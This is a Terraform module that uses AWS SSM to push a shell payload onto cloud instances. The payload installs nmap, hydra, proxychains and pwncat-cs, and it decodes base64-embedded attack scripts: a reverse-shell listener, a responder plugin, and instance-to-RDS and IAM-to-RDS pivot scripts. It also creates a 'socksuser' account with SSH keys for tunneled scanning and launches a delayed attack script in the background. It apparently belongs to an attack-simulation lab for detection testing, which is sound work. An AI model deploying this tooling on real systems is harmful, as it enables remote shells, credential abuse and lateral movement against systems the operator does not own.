locals {
    listen_port = var.listen_port
    listen_ip = var.listen_ip
    attack_dir = "/pwncat"
    attack_script = "pwncat.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_pwncat.lock"
    base64_command_payload = base64encode(var.payload)
    payload = <<-EOT
    LOCKFILE="${ local.lock_file }"
    if [ -e "$LOCKFILE" ]; then
        echo "Another instance of the script is already running. Exiting..."
        exit 1
    fi
    LOGFILE=/tmp/${var.tag}.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    if ! which proxychains > /dev/null || ! which nmap > /dev/null || ! which hydra > /dev/null; then
        log "installing proxychains4 nmap hydra..."
        apt-get update && apt-get install -y proxychains4 nmap hydra python3-pip
        python3 -m pip install jc
    else
        log "proxychains4 nmap and hydra already installed - skipping..."
    fi
    if [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; then
        log "Pwncat session lock /tmp/pwncat_session.lock exists and pwncat screen session running. Skipping setup."
    else
        rm -f "/tmp/pwncat_session.lock"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
        screen -S pwncat -X quit
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${local.pwncat} | base64 -d > ${local.attack_script}
        echo ${local.delayed_start} | base64 -d > ${local.start_script}
        echo ${local.listener} | base64 -d > listener.py
        echo ${local.responder} | base64 -d > plugins/responder.py
        echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
        echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        log "starting background delayed script start..."
        nohup /bin/bash ${local.start_script} >/dev/null 2>&1 &
        log "background job started"
        if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
            log "adding tunneled port scanning user - socksuser..."
            adduser socksuser >> $LOGFILE 2>&1
            log "adding ssh keys for socks user..."
            sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            log "socksuser setup complete..."
        fi
    fi
    log "done."
    EOT
    base64_payload = base64encode(local.payload)

    
    pwncat          = base64encode(templatefile(
                                "${path.module}/resources/pwncat.sh",
                                {
                                    listen_port = local.listen_port
                                }
                            ))

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    lock_file = local.lock_file
                                    attack_delay = var.attack_delay
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    listener        = base64encode(file(
                                "${path.module}/resources/listener.py", 
                            ))
    responder       = base64encode(templatefile(
                                "${path.module}/resources/responder.py", 
                                {
                                    default_payload = var.payload,
                                    iam2rds_role_name = var.iam2rds_role_name
                                    iam2rds_session_name = "${var.iam2rds_session_name}-${var.deployment}"
                                }
                            ))
    instance2rds    = base64encode(templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment
                                }
                            ))

    iam2rds         = base64encode(templatefile(
                                "${path.module}/resources/iam2rds.sh", 
                                {
                                    region = var.region,
                                    environment = var.environment,
                                    deployment = var.deployment,
                                    iam2rds_role_name = var.iam2rds_role_name
                                    iam2rds_session_name = "${var.iam2rds_session_name}-${var.deployment}"
                                }
                            ))
}

###########################
# SSM 
###########################

module "ssm" {
    source          = "../../../../../../common/aws/ssm/base"
    environment     = var.environment
    deployment      = var.deployment
    tag             = var.tag
    timeout         = var.timeout
    cron            = var.cron
    base64_payload  = local.base64_payload
}